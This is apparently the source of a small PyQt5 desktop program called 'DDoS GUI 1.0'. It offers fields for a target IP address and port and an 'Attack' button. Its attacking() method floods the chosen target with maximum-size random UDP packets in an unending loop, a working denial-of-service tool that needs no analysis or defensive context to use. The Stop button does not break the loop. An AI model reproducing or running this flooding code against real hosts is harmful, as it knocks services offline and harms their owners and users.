# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'main.ui'
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets, QtTest
import socket
import os
import time


class Ui_MainWindow(object):
    stop_code = False
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(65507)
    

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.setEnabled(True)
        MainWindow.resize(494, 278)
        MainWindow.setMinimumSize(QtCore.QSize(494, 278))
        MainWindow.setMaximumSize(QtCore.QSize(494, 278))
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("asset/DDoS_LOGO.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.plainTextEdit = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.plainTextEdit.setEnabled(False)
        self.plainTextEdit.setGeometry(QtCore.QRect(170, 10, 311, 151))
        self.plainTextEdit.setObjectName("plainTextEdit")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(30, 240, 111, 16))
        self.label.setStyleSheet("font: 8pt \"Microsoft Sans Serif\";")
        self.label.setObjectName("label")
        self.progressBar = QtWidgets.QProgressBar(self.centralwidget)
        self.progressBar.setGeometry(QtCore.QRect(170, 180, 311, 71))
        self.progressBar.setProperty("value", 0)
        self.progressBar.setTextVisible(False)
        self.progressBar.setObjectName("progressBar")
        self.widget = QtWidgets.QWidget(self.centralwidget)
        self.widget.setGeometry(QtCore.QRect(10, 180, 141, 54))
        self.widget.setObjectName("widget")
        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.widget)
        self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.attack = QtWidgets.QPushButton(self.widget)
        self.attack.setObjectName("attack")
        self.verticalLayout_2.addWidget(self.attack)
        self.stop = QtWidgets.QPushButton(self.widget)
        self.stop.setObjectName("stop")
        self.verticalLayout_2.addWidget(self.stop)
        self.widget1 = QtWidgets.QWidget(self.centralwidget)
        self.widget1.setGeometry(QtCore.QRect(10, 10, 141, 151))
        self.widget1.setObjectName("widget1")
        self.verticalLayout_4 = QtWidgets.QVBoxLayout(self.widget1)
        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_4.setObjectName("verticalLayout_4")
        self.verticalLayout_3 = QtWidgets.QVBoxLayout()
        self.verticalLayout_3.setObjectName("verticalLayout_3")
        self.title_ip = QtWidgets.QLabel(self.widget1)
        self.title_ip.setStyleSheet("font: 16pt \"Microsoft Sans Serif\";")
        self.title_ip.setObjectName("title_ip")
        self.verticalLayout_3.addWidget(self.title_ip)
        self.ip = QtWidgets.QLineEdit(self.widget1)
        self.ip.setObjectName("ip")
        self.verticalLayout_3.addWidget(self.ip)
        self.verticalLayout_4.addLayout(self.verticalLayout_3)
        self.verticalLayout = QtWidgets.QVBoxLayout()
        self.verticalLayout.setObjectName("verticalLayout")
        self.title_port = QtWidgets.QLabel(self.widget1)
        self.title_port.setStyleSheet("font: 16pt \"Microsoft Sans Serif\";")
        self.title_port.setObjectName("title_port")
        self.verticalLayout.addWidget(self.title_port)
        self.port = QtWidgets.QLineEdit(self.widget1)
        self.port.setText("")
        self.port.setObjectName("port")
        self.verticalLayout.addWidget(self.port)
        self.verticalLayout_4.addLayout(self.verticalLayout)
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.actionMade_by_aattoommiicc = QtWidgets.QAction(MainWindow)
        self.actionMade_by_aattoommiicc.setObjectName("actionMade_by_aattoommiicc")
        self.plainTextEdit.setReadOnly(True)
        self.attack.clicked.connect(self.shoot)
        #self.attack.clicked.connect(self.loop)                                         # Broken
        self.attack.clicked.connect(self.attacking)
        self.stop.clicked.connect(self.stoped)
        

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "DDoS GUI 1.0"))
        self.label.setText(_translate("MainWindow", "Made by aattoommiicc"))
        self.attack.setText(_translate("MainWindow", "Attack"))
        self.stop.setText(_translate("MainWindow", "Stop"))
        self.title_ip.setText(_translate("MainWindow", "IP Address"))
        self.title_port.setText(_translate("MainWindow", "Port"))
        self.actionMade_by_aattoommiicc.setText(_translate("MainWindow", "Made by aattoommiicc"))

    def shoot(self):
        self.stop_code = False
        target_ip = str(self.ip.text())
        target_port = int(self.port.text())
        self.plainTextEdit.appendPlainText(f"Attacking to {target_ip} with port {target_port}")
    
    def attacking(self):
        if self.stop_code == False:
            target_ip = str(self.ip.text())
            target_port = int(self.port.text())
            while True:
                self.s.sendto(self.data, (target_ip, target_port))

    def stoped(self):
        self.ip.setText("")
        self.port.setText("")
        self.plainTextEdit.setPlainText("")
        self.stop_code = True

    #def loop(self,x):
        #if self.stop_code == False:
            #if x <= 100:
                #QtTest.QTest.qWait(50)
                #self.progressBar.setValue(x)
                #return self.loop(x+1)

            #else:
                #self.progressBar.setValue(0)
                #x = 0
                #return self.loop(x)
        #else:
            #self.progressBar.setValue(0)

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())